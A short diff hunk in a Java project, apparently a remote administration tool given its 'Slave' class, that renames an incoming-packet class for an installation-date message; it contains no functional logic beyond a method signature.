@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import com.redpois0n.Slave;
 
-public class PacketDATE extends AbstractIncomingPacket {
+public class Packet31InitInstallationDate extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
